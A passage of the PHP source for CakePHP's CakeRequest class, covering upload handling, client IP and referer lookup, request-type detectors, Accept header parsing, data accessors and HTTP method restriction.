				if ($name !== 'data') {
					$this->params['form'][$name] = $data;
				}
			}
		}

		if (isset($_FILES['data'])) {
			foreach ($_FILES['data'] as $key => $data) {
				$this->_processFileData('', $data, $key);
			}
		}
	}

/**
 * Recursively walks the FILES array restructuring the data
 * into something sane and useable.
 *
 * @param string $path The dot separated path to insert $data into.
 * @param array $data The data to traverse/insert.
 * @param string $field The terminal field name, which is the top level key in $_FILES.
 * @return void
 */
	protected function _processFileData($path, $data, $field) {
		foreach ($data as $key => $fields) {
			$newPath = $key;
			if (strlen($path) > 0) {
				$newPath = $path . '.' . $key;
			}
			if (is_array($fields)) {
				$this->_processFileData($newPath, $fields, $field);
			} else {
				$newPath .= '.' . $field;
				$this->data = Hash::insert($this->data, $newPath, $fields);
			}
		}
	}

/**
 * Get the IP the client is using, or says they are using.
 *
 * @param bool $safe Use safe = false when you think the user might manipulate their HTTP_CLIENT_IP
 *   header. Setting $safe = false will also look at HTTP_X_FORWARDED_FOR
 * @return string The client IP.
 */
	public function clientIp($safe = true) {
		if (!$safe && env('HTTP_X_FORWARDED_FOR')) {
			$ipaddr = preg_replace('/(?:,.*)/', '', env('HTTP_X_FORWARDED_FOR'));
		} else {
			if (env('HTTP_CLIENT_IP')) {
				$ipaddr = env('HTTP_CLIENT_IP');
			} else {
				$ipaddr = env('REMOTE_ADDR');
			}
		}

		if (env('HTTP_CLIENTADDRESS')) {
			$tmpipaddr = env('HTTP_CLIENTADDRESS');

			if (!empty($tmpipaddr)) {
				$ipaddr = preg_replace('/(?:,.*)/', '', $tmpipaddr);
			}
		}
		return trim($ipaddr);
	}

/**
 * Returns the referer that referred this request.
 *
 * @param bool $local Attempt to return a local address. Local addresses do not contain hostnames.
 * @return string The referring address for this request.
 */
	public function referer($local = false) {
		$ref = env('HTTP_REFERER');

		$base = Configure::read('App.fullBaseUrl') . $this->webroot;
		if (!empty($ref) && !empty($base)) {
			if ($local && strpos($ref, $base) === 0) {
				$ref = substr($ref, strlen($base));
				if ($ref[0] !== '/') {
					$ref = '/' . $ref;
				}
				return $ref;
			} elseif (!$local) {
				return $ref;
			}
		}
		return '/';
	}

/**
 * Missing method handler, handles wrapping older style isAjax() type methods
 *
 * @param string $name The method called
 * @param array $params Array of parameters for the method call
 * @return mixed
 * @throws CakeException when an invalid method is called.
 */
	public function __call($name, $params) {
		if (strpos($name, 'is') === 0) {
			$type = strtolower(substr($name, 2));
			return $this->is($type);
		}
		throw new CakeException(__d('cake_dev', 'Method %s does not exist', $name));
	}

/**
 * Magic get method allows access to parsed routing parameters directly on the object.
 *
 * Allows access to `$this->params['controller']` via `$this->controller`
 *
 * @param string $name The property being accessed.
 * @return mixed Either the value of the parameter or null.
 */
	public function __get($name) {
		if (isset($this->params[$name])) {
			return $this->params[$name];
		}
		return null;
	}

/**
 * Magic isset method allows isset/empty checks
 * on routing parameters.
 *
 * @param string $name The property being accessed.
 * @return bool Existence
 */
	public function __isset($name) {
		return isset($this->params[$name]);
	}

/**
 * Check whether or not a Request is a certain type.
 *
 * Uses the built in detection rules as well as additional rules
 * defined with CakeRequest::addDetector(). Any detector can be called
 * as `is($type)` or `is$Type()`.
 *
 * @param string|array $type The type of request you want to check. If an array
 *   this method will return true if the request matches any type.
 * @return bool Whether or not the request is the type you are checking.
 */
	public function is($type) {
		if (is_array($type)) {
			$result = array_map(array($this, 'is'), $type);
			return count(array_filter($result)) > 0;
		}
		$type = strtolower($type);
		if (!isset($this->_detectors[$type])) {
			return false;
		}
		$detect = $this->_detectors[$type];
		if (isset($detect['env'])) {
			if (isset($detect['value'])) {
				return env($detect['env']) == $detect['value'];
			}
			if (isset($detect['pattern'])) {
				return (bool)preg_match($detect['pattern'], env($detect['env']));
			}
			if (isset($detect['options'])) {
				$pattern = '/' . implode('|', $detect['options']) . '/i';
				return (bool)preg_match($pattern, env($detect['env']));
			}
		}
		if (isset($detect['param'])) {
			$key = $detect['param'];
			if (isset($detect['value'])) {
				$value = $detect['value'];
				return isset($this->params[$key]) ? $this->params[$key] == $value : false;
			}
			if (isset($detect['options'])) {
				return isset($this->params[$key]) ? in_array($this->params[$key], $detect['options']) : false;
			}
		}
		if (isset($detect['callback']) && is_callable($detect['callback'])) {
			return call_user_func($detect['callback'], $this);
		}
		return false;
	}

/**
 * Check that a request matches all the given types.
 *
 * Allows you to test multiple types and union the results.
 * See CakeRequest::is() for how to add additional types and the
 * built-in types.
 *
 * @param array $types The types to check.
 * @return bool Success.
 * @see CakeRequest::is()
 */
	public function isAll(array $types) {
		$result = array_filter(array_map(array($this, 'is'), $types));
		return count($result) === count($types);
	}

/**
 * Add a new detector to the list of detectors that a request can use.
 * There are several different formats and types of detectors that can be set.
 *
 * ### Environment value comparison
 *
 * An environment value comparison, compares a value fetched from `env()` to a known value
 * the environment value is equality checked against the provided value.
 *
 * e.g `addDetector('post', array('env' => 'REQUEST_METHOD', 'value' => 'POST'))`
 *
 * ### Pattern value comparison
 *
 * Pattern value comparison allows you to compare a value fetched from `env()` to a regular expression.
 *
 * e.g `addDetector('iphone', array('env' => 'HTTP_USER_AGENT', 'pattern' => '/iPhone/i'));`
 *
 * ### Option based comparison
 *
 * Option based comparisons use a list of options to create a regular expression. Subsequent calls
 * to add an already defined options detector will merge the options.
 *
 * e.g `addDetector('mobile', array('env' => 'HTTP_USER_AGENT', 'options' => array('Fennec')));`
 *
 * ### Callback detectors
 *
 * Callback detectors allow you to provide a 'callback' type to handle the check. The callback will
 * receive the request object as its only parameter.
 *
 * e.g `addDetector('custom', array('callback' => array('SomeClass', 'somemethod')));`
 *
 * ### Request parameter detectors
 *
 * Allows for custom detectors on the request parameters.
 *
 * e.g `addDetector('requested', array('param' => 'requested', 'value' => 1)`
 *
 * You can also make parameter detectors that accept multiple values
 * using the `options` key. This is useful when you want to check
 * if a request parameter is in a list of options.
 *
 * `addDetector('extension', array('param' => 'ext', 'options' => array('pdf', 'csv'))`
 *
 * @param string $name The name of the detector.
 * @param array $options The options for the detector definition. See above.
 * @return void
 */
	public function addDetector($name, $options) {
		$name = strtolower($name);
		if (isset($this->_detectors[$name]) && isset($options['options'])) {
			$options = Hash::merge($this->_detectors[$name], $options);
		}
		$this->_detectors[$name] = $options;
	}

/**
 * Add parameters to the request's parsed parameter set. This will overwrite any existing parameters.
 * This modifies the parameters available through `$request->params`.
 *
 * @param array $params Array of parameters to merge in
 * @return $this
 */
	public function addParams($params) {
		$this->params = array_merge($this->params, (array)$params);
		return $this;
	}

/**
 * Add paths to the requests' paths vars. This will overwrite any existing paths.
 * Provides an easy way to modify, here, webroot and base.
 *
 * @param array $paths Array of paths to merge in
 * @return $this
 */
	public function addPaths($paths) {
		foreach (array('webroot', 'here', 'base') as $element) {
			if (isset($paths[$element])) {
				$this->{$element} = $paths[$element];
			}
		}
		return $this;
	}

/**
 * Get the value of the current requests URL. Will include named parameters and querystring arguments.
 *
 * @param bool $base Include the base path, set to false to trim the base path off.
 * @return string the current request URL including query string args.
 */
	public function here($base = true) {
		$url = $this->here;
		if (!empty($this->query)) {
			$url .= '?' . http_build_query($this->query, null, '&');
		}
		if (!$base) {
			$url = preg_replace('/^' . preg_quote($this->base, '/') . '/', '', $url, 1);
		}
		return $url;
	}

/**
 * Read an HTTP header from the Request information.
 *
 * @param string $name Name of the header you want.
 * @return mixed Either false on no header being set or the value of the header.
 */
	public static function header($name) {
		$name = 'HTTP_' . strtoupper(str_replace('-', '_', $name));
		if (!empty($_SERVER[$name])) {
			return $_SERVER[$name];
		}
		return false;
	}

/**
 * Get the HTTP method used for this request.
 * There are a few ways to specify a method.
 *
 * - If your client supports it you can use native HTTP methods.
 * - You can set the HTTP-X-Method-Override header.
 * - You can submit an input with the name `_method`
 *
 * Any of these 3 approaches can be used to set the HTTP method used
 * by CakePHP internally, and will effect the result of this method.
 *
 * @return string The name of the HTTP method used.
 */
	public function method() {
		return env('REQUEST_METHOD');
	}

/**
 * Get the host that the request was handled on.
 *
 * @param bool $trustProxy Whether or not to trust the proxy host.
 * @return string
 */
	public function host($trustProxy = false) {
		if ($trustProxy) {
			return env('HTTP_X_FORWARDED_HOST');
		}
		return env('HTTP_HOST');
	}

/**
 * Get the domain name and include $tldLength segments of the tld.
 *
 * @param int $tldLength Number of segments your tld contains. For example: `example.com` contains 1 tld.
 *   While `example.co.uk` contains 2.
 * @return string Domain name without subdomains.
 */
	public function domain($tldLength = 1) {
		$segments = explode('.', $this->host());
		$domain = array_slice($segments, -1 * ($tldLength + 1));
		return implode('.', $domain);
	}

/**
 * Get the subdomains for a host.
 *
 * @param int $tldLength Number of segments your tld contains. For example: `example.com` contains 1 tld.
 *   While `example.co.uk` contains 2.
 * @return array An array of subdomains.
 */
	public function subdomains($tldLength = 1) {
		$segments = explode('.', $this->host());
		return array_slice($segments, 0, -1 * ($tldLength + 1));
	}

/**
 * Find out which content types the client accepts or check if they accept a
 * particular type of content.
 *
 * #### Get all types:
 *
 * `$this->request->accepts();`
 *
 * #### Check for a single type:
 *
 * `$this->request->accepts('application/json');`
 *
 * This method will order the returned content types by the preference values indicated
 * by the client.
 *
 * @param string $type The content type to check for. Leave null to get all types a client accepts.
 * @return mixed Either an array of all the types the client accepts or a boolean if they accept the
 *   provided type.
 */
	public function accepts($type = null) {
		$raw = $this->parseAccept();
		$accept = array();
		foreach ($raw as $types) {
			$accept = array_merge($accept, $types);
		}
		if ($type === null) {
			return $accept;
		}
		return in_array($type, $accept);
	}

/**
 * Parse the HTTP_ACCEPT header and return a sorted array with content types
 * as the keys, and pref values as the values.
 *
 * Generally you want to use CakeRequest::accept() to get a simple list
 * of the accepted content types.
 *
 * @return array An array of prefValue => array(content/types)
 */
	public function parseAccept() {
		return $this->_parseAcceptWithQualifier($this->header('accept'));
	}

/**
 * Get the languages accepted by the client, or check if a specific language is accepted.
 *
 * Get the list of accepted languages:
 *
 * {{{ CakeRequest::acceptLanguage(); }}}
 *
 * Check if a specific language is accepted:
 *
 * {{{ CakeRequest::acceptLanguage('es-es'); }}}
 *
 * @param string $language The language to test.
 * @return mixed If a $language is provided, a boolean. Otherwise the array of accepted languages.
 */
	public static function acceptLanguage($language = null) {
		$raw = self::_parseAcceptWithQualifier(self::header('Accept-Language'));
		$accept = array();
		foreach ($raw as $languages) {
			foreach ($languages as &$lang) {
				if (strpos($lang, '_')) {
					$lang = str_replace('_', '-', $lang);
				}
				$lang = strtolower($lang);
			}
			$accept = array_merge($accept, $languages);
		}
		if ($language === null) {
			return $accept;
		}
		return in_array(strtolower($language), $accept);
	}

/**
 * Parse Accept* headers with qualifier options.
 *
 * Only qualifiers will be extracted, any other accept extensions will be
 * discarded as they are not frequently used.
 *
 * @param string $header Header to parse.
 * @return array
 */
	protected static function _parseAcceptWithQualifier($header) {
		$accept = array();
		$header = explode(',', $header);
		foreach (array_filter($header) as $value) {
			$prefValue = '1.0';
			$value = trim($value);

			$semiPos = strpos($value, ';');
			if ($semiPos !== false) {
				$params = explode(';', $value);
				$value = trim($params[0]);
				foreach ($params as $param) {
					$qPos = strpos($param, 'q=');
					if ($qPos !== false) {
						$prefValue = substr($param, $qPos + 2);
					}
				}
			}

			if (!isset($accept[$prefValue])) {
				$accept[$prefValue] = array();
			}
			if ($prefValue) {
				$accept[$prefValue][] = $value;
			}
		}
		krsort($accept);
		return $accept;
	}

/**
 * Provides a read accessor for `$this->query`. Allows you
 * to use a syntax similar to `CakeSession` for reading URL query data.
 *
 * @param string $name Query string variable name
 * @return mixed The value being read
 */
	public function query($name) {
		return Hash::get($this->query, $name);
	}

/**
 * Provides a read/write accessor for `$this->data`. Allows you
 * to use a syntax similar to `CakeSession` for reading post data.
 *
 * ## Reading values.
 *
 * `$request->data('Post.title');`
 *
 * When reading values you will get `null` for keys/values that do not exist.
 *
 * ## Writing values
 *
 * `$request->data('Post.title', 'New post!');`
 *
 * You can write to any value, even paths/keys that do not exist, and the arrays
 * will be created for you.
 *
 * @param string $name Dot separated name of the value to read/write, one or more args.
 * @return mixed|$this Either the value being read, or $this so you can chain consecutive writes.
 */
	public function data($name) {
		$args = func_get_args();
		if (count($args) === 2) {
			$this->data = Hash::insert($this->data, $name, $args[1]);
			return $this;
		}
		return Hash::get($this->data, $name);
	}

/**
 * Safely access the values in $this->params.
 *
 * @param string $name The name of the parameter to get.
 * @return mixed The value of the provided parameter. Will
 *   return false if the parameter doesn't exist or is falsey.
 */
	public function param($name) {
		if (!isset($this->params[$name])) {
			return false;
		}
		return $this->params[$name];
	}

/**
 * Read data from `php://input`. Useful when interacting with XML or JSON
 * request body content.
 *
 * Getting input with a decoding function:
 *
 * `$this->request->input('json_decode');`
 *
 * Getting input using a decoding function, and additional params:
 *
 * `$this->request->input('Xml::build', array('return' => 'DOMDocument'));`
 *
 * Any additional parameters are applied to the callback in the order they are given.
 *
 * @param string $callback A decoding callback that will convert the string data to another
 *     representation. Leave empty to access the raw input data. You can also
 *     supply additional parameters for the decoding callback using var args, see above.
 * @return The decoded/processed request data.
 */
	public function input($callback = null) {
		$input = $this->_readInput();
		$args = func_get_args();
		if (!empty($args)) {
			$callback = array_shift($args);
			array_unshift($args, $input);
			return call_user_func_array($callback, $args);
		}
		return $input;
	}

/**
 * Allow only certain HTTP request methods. If the request method does not match
 * a 405 error will be shown and the required "Allow" response header will be set.
 *
 * Example:
 *
 * $this->request->allowMethod('post', 'delete');
 * or
 * $this->request->allowMethod(array('post', 'delete'));
 *
 * If the request would be GET, response header "Allow: POST, DELETE" will be set
 * and a 405 error will be returned.
 *
 * @param string|array $methods Allowed HTTP request methods.
 * @return bool true
 * @throws MethodNotAllowedException
 */
	public function allowMethod($methods) {
		if (!is_array($methods)) {
			$methods = func_get_args();
		}
		foreach ($methods as $method) {
			if ($this->is($method)) {
				return true;
			}
		}
		$allowed = strtoupper(implode(', ', $methods));
		$e = new MethodNotAllowedException();
		$e->responseHeader('Allow', $allowed);
		throw $e;
	}

/**
 * Alias of CakeRequest::allowMethod() for backwards compatibility.
 *
 * @param string|array $methods Allowed HTTP request methods.
 * @return bool true
 * @throws MethodNotAllowedException
 * @see CakeRequest::allowMethod()
 * @deprecated 3.0.0 Since 2.5, use CakeRequest::allowMethod() instead.
 */
	public function onlyAllow($methods) {
		if (!is_array($methods)) {
			$methods = func_get_args();
		}
		return $this->allowMethod($methods);
	}

/**
 * Read data from php://input, mocked in tests.
 *
 * @return string contents of php://input
 */
	protected function _readInput() {
		if (empty($this->_input)) {
			$fh = fopen('php://input', 'r');
			$content = stream_get_contents($fh);
			fclose($fh);
			$this->_input = $content;
		}
		return $this->_input;
	}

/**
 * Array access read implementation
 *
 * @param string $name Name of the key being accessed.
 * @return mixed
 */
	public function offsetGet($name) {
		if (isset($this->params[$name])) {
			return $this->params[$name];
		}
		if ($name === 'url') {
			return $this->query;
		}
		if ($name === 'data') {
			return $this->data;
		}
		return null;
	}

/**
 * Array access write implementation
 *
 * @param string $name Name of the key being written
 * @param mixed $value The value being written.
 * @return void
 */
	public function offsetSet($name, $value) {
		$this->params[$name] = $value;
	}

/**
 * Array access isset() implementation
 *
 * @param string $name thing to check.
 * @return bool
 */
	public function offsetExists($name) {
		return isset($this->params[$name]);
	}

/**
 * Array access unset() implementation
 *
 * @param string $name Name to unset.
 * @return void
 */
	public function offsetUnset($name) {
		unset($this->params[$name]);
	}

}
